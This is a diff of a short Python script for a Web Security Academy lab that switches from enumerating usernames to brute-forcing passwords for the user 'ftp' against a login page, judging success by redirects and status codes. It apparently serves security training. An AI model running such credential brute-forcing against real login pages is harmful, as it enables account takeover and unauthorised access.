@@ -1,18 +1,16 @@
 import requests
 
-URL = "https://0a7c00060403afd6806b213600c5007d.web-security-academy.net/login"
+URL = "https://0a5200d70462afc780c82195000900c2.web-security-academy.net/login"
 
-with open("expanded_list.txt", "r") as f:
-    usernames = f.read().splitlines()
+with open("passwords.txt", "r") as f:
+    passwords = f.read().splitlines()
 
 print("[*] ユーザー名の列挙（Enumeration）を開始します！")
 
-
-
-for username in usernames:
+for password in passwords:
     data = {
-        "username": username,
-        "password": 'a'
+        "username": 'ftp',
+        "password": password
     }
 
     # リダイレクト有無を判定するため、POST後に自動追従しない
@@ -22,6 +20,6 @@ for username in usernames:
     location = response.headers.get("Location", "-")
 
     print(
-        f"username: {username:15} | redirect: {is_redirect!s:5} "
+        f"password: {password:15} | redirect: {is_redirect!s:5} "
         f"| status: {response.status_code} | location: {location}"
     )
